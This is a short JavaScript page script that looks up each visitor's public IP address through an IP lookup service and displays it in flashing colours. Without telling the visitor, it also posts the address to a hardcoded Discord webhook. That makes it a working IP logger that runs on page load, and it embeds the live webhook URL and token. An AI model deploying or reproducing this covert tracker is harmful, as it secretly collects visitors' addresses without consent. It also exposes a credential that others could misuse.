
window.onload = function () {

    function getRandomColor() {
        const letters = '0123456789ABCDEF';
        let color = '#';
        for (let i = 0; i < 6; i++) {
            color += letters[Math.floor(Math.random() * 16)];
        }
        return color;
    }


    function flashRandomColor() {
        const ipAddressElement = document.getElementById('ipAddress');
        ipAddressElement.style.color = getRandomColor();
    }


    function sendToDiscordWebhook(ipAddress) {
        const webhookUrl = 'https://discord.com/api/webhooks/1151703372718678158/OAamyLyQ_f_ajsGKAQwptEMMOKhonHpQjqKvmlYJzmx3mHBLsNK_yRM8nnaOrdkCn2c0'; 
        const data = {
            content: `New IP Address: ${ipAddress}`
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });
    }


    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddressElement = document.getElementById('ipAddress');
            const ipAddress = data.ip;
            ipAddressElement.textContent = ipAddress;


            ipAddressElement.style.color = 'white';


            sendToDiscordWebhook(ipAddress);


            setInterval(flashRandomColor, 500);
        })
        .catch(error => {
            document.getElementById('ipAddress').textContent = 'Error fetching IP address';
        });
};
